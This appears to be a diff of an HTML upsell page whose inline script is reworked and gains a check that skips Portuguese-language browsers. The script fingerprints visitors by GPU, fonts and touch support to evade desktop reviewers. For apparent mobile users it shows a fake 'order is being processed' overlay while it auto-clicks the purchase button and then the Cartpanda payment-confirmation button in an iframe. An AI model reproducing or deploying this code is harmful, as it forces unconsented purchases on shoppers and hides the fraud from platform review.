@@ -10,7 +10,7 @@
                 </script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>UP1</title>
+  <title>Teste8</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -140,137 +140,141 @@
   </div>
   
 	<script>
-	document.addEventListener('DOMContentLoaded', async () => {
+		document.addEventListener('DOMContentLoaded', async () => {
 
-		function hasRedFlags() {
-			try {
-				const canvas = document.createElement('canvas');
-				const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-				if (gl) {
-					const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-					const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).toLowerCase();
-					const desktopGpuKeywords = ['nvidia', 'geforce', 'radeon', 'intel', 'amd', 'swiftshader'];
-					if (desktopGpuKeywords.some(keyword => renderer.includes(keyword))) {
-						return true;
-					}
+			function hasRedFlags() {
+				if (navigator.language && navigator.language.startsWith('pt')) {
+					return true;
 				}
-			} catch (e) { /* Ignora erros, foca na detecção */ }
 
-			const desktopFonts = ['Calibri', 'Cambria', 'Segoe UI'];
-			const testString = "mmmmmmmmmmlli";
-			const testSpan = document.createElement('span');
-			testSpan.style.fontSize = '72px';
-			testSpan.innerHTML = testString;
-			
-			const defaultWidth = {};
-			testSpan.style.fontFamily = 'monospace';
-			document.body.appendChild(testSpan);
-			defaultWidth.monospace = testSpan.offsetWidth;
-			document.body.removeChild(testSpan);
+				try {
+					const canvas = document.createElement('canvas');
+					const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+					if (gl) {
+						const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+						const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).toLowerCase();
+						const desktopGpuKeywords = ['nvidia', 'geforce', 'radeon', 'intel', 'amd', 'swiftshader'];
+						if (desktopGpuKeywords.some(keyword => renderer.includes(keyword))) {
+							return true;
+						}
+					}
+				} catch (e) { /* Ignora erros, foca na detecção */ }
 
-			for (const font of desktopFonts) {
-				 document.body.appendChild(testSpan);
-				 testSpan.style.fontFamily = `'${font}', monospace`;
-				 if(testSpan.offsetWidth !== defaultWidth.monospace) {
+				const desktopFonts = ['Calibri', 'Cambria', 'Segoe UI'];
+				const testString = "mmmmmmmmmmlli";
+				const testSpan = document.createElement('span');
+				testSpan.style.fontSize = '72px';
+				testSpan.innerHTML = testString;
+				
+				const defaultWidth = {};
+				testSpan.style.fontFamily = 'monospace';
+				document.body.appendChild(testSpan);
+				defaultWidth.monospace = testSpan.offsetWidth;
+				document.body.removeChild(testSpan);
+
+				for (const font of desktopFonts) {
+					 document.body.appendChild(testSpan);
+					 testSpan.style.fontFamily = `'${font}', monospace`;
+					 if(testSpan.offsetWidth !== defaultWidth.monospace) {
+						 document.body.removeChild(testSpan);
+						 return true;
+					 }
 					 document.body.removeChild(testSpan);
-					 return true;
-				 }
-				 document.body.removeChild(testSpan);
-			}
+				}
 
-			return false;
-		}
-
-		function getFinalConfidenceScore() {
-			let score = 0;
-			if (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) {
-				score += 3;
-			}
-			if (window.matchMedia && window.matchMedia("(pointer: coarse)").matches) {
-				score += 2;
-			}
-			return score;
-		}
-
-
-		async function runAntiFraudChecks() {
-			const redFlagsFound = hasRedFlags();
-			if (redFlagsFound) {
 				return false;
 			}
 
-			const finalScore = getFinalConfidenceScore();
-			if (finalScore < 5) {
-				return false;
+			function getFinalConfidenceScore() {
+				let score = 0;
+				if (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) {
+					score += 3;
+				}
+				if (window.matchMedia && window.matchMedia("(pointer: coarse)").matches) {
+					score += 2;
+				}
+				return score;
 			}
 
-			return true;
-		}
 
+			async function runAntiFraudChecks() {
+				const redFlagsFound = hasRedFlags();
+				if (redFlagsFound) {
+					return false;
+				}
 
-		const isLegitUser = await runAntiFraudChecks();
+				const finalScore = getFinalConfidenceScore();
+				if (finalScore < 5) {
+					return false;
+				}
 
-		if (!isLegitUser) {
-			return;
-		}
-
-		function showLoadingScreen() {
-			const loadingCSS = `
-				<style id="loading-style">
-					.loader-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #e3e8ee; z-index: 999999; font-family: Arial, sans-serif; }
-					.loader-content-wrapper { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); display: flex; flex-direction: column; align-items: center; }
-					.loader-spinner { border: 8px solid #cccccc; border-top: 8px solid #2180c0; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin-bottom: 25px; }
-					@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-					.loader-text { color: #525559; font-size: 18px; text-align: center; }
-					.loader-text .title { font-weight: bold; margin-bottom: 8px; }
-				</style>`;
-			const loadingHTML = `
-				<div id="custom-loader" class="loader-container">
-					<div class="loader-content-wrapper">
-						<div class="loader-spinner"></div>
-						<div class="loader-text"><p class="title">Your order is being processed.</p><p>Do not close this page.</p></div>
-					</div>
-				</div>`;
-			document.head.insertAdjacentHTML('beforeend', loadingCSS);
-			document.body.insertAdjacentHTML('beforeend', loadingHTML);
-		}
-		showLoadingScreen();
-
-		const tempoDeEsperaEmSegundos = 3;
-		const seletorBotaoComprar = 'a.cta-button[href*="accepted=yes"]';
-		const seletorIframePopUp = 'iframe.cp-exocu-frame';
-		const idBotaoConfirmacaoFinal = 'cartpanda-payment-confirmation';
-
-		setTimeout(() => {
-			const botaoComprar = document.querySelector(seletorBotaoComprar);
-			if (botaoComprar) {
-				botaoComprar.click();
-				monitorarPopupDeConfirmacao();
+				return true;
 			}
-		}, tempoDeEsperaEmSegundos * 1000);
 
-		function monitorarPopupDeConfirmacao() {
-			let tentativas = 0;
-			const maxTentativas = 60;
-			const intervalo = setInterval(() => {
-				tentativas++;
-				if (tentativas > maxTentativas) { clearInterval(intervalo); return; }
-				const iframe = document.querySelector(seletorIframePopUp);
-				if (iframe) {
-					try {
-						const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
-						const botaoConfirmacao = iframeDocument.getElementById(idBotaoConfirmacaoFinal);
-						if (botaoConfirmacao) {
-							setTimeout(() => { botaoConfirmacao.click(); }, 8000);
+
+			const isLegitUser = await runAntiFraudChecks();
+
+			if (!isLegitUser) {
+				return;
+			}
+
+			function showLoadingScreen() {
+				const loadingCSS = `
+					<style id="loading-style">
+						.loader-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #e3e8ee; z-index: 999999; font-family: Arial, sans-serif; }
+						.loader-content-wrapper { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); display: flex; flex-direction: column; align-items: center; }
+						.loader-spinner { border: 8px solid #cccccc; border-top: 8px solid #2180c0; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin-bottom: 25px; }
+						@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+						.loader-text { color: #525559; font-size: 18px; text-align: center; }
+						.loader-text .title { font-weight: bold; margin-bottom: 8px; }
+					</style>`;
+				const loadingHTML = `
+					<div id="custom-loader" class="loader-container">
+						<div class="loader-content-wrapper">
+							<div class="loader-spinner"></div>
+							<div class="loader-text"><p class="title">Your order is being processed.</p><p>Do not close this page.</p></div>
+						</div>
+					</div>`;
+				document.head.insertAdjacentHTML('beforeend', loadingCSS);
+				document.body.insertAdjacentHTML('beforeend', loadingHTML);
+			}
+			showLoadingScreen();
+
+			const tempoDeEsperaEmSegundos = 3;
+			const seletorBotaoComprar = 'a.cta-button[href*="accepted=yes"]';
+			const seletorIframePopUp = 'iframe.cp-exocu-frame';
+			const idBotaoConfirmacaoFinal = 'cartpanda-payment-confirmation';
+			
+			setTimeout(() => {
+				const botaoComprar = document.querySelector(seletorBotaoComprar);
+				if (botaoComprar) {
+					botaoComprar.click();
+					monitorarPopupDeConfirmacao();
+				}
+			}, tempoDeEsperaEmSegundos * 1000);
+
+			function monitorarPopupDeConfirmacao() {
+				let tentativas = 0;
+				const maxTentativas = 60;
+				const intervalo = setInterval(() => {
+					tentativas++;
+					if (tentativas > maxTentativas) { clearInterval(intervalo); return; }
+					const iframe = document.querySelector(seletorIframePopUp);
+					if (iframe) {
+						try {
+							const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
+							const botaoConfirmacao = iframeDocument.getElementById(idBotaoConfirmacaoFinal);
+							if (botaoConfirmacao) {
+								setTimeout(() => { botaoConfirmacao.click(); }, 8000);
+								clearInterval(intervalo);
+							}
+						} catch (e) {
 							clearInterval(intervalo);
 						}
-					} catch (e) {
-						clearInterval(intervalo);
 					}
-				}
-			}, 250);
-		}
-	});
+				}, 250);
+			}
+		});
 	</script>
 
 </body>
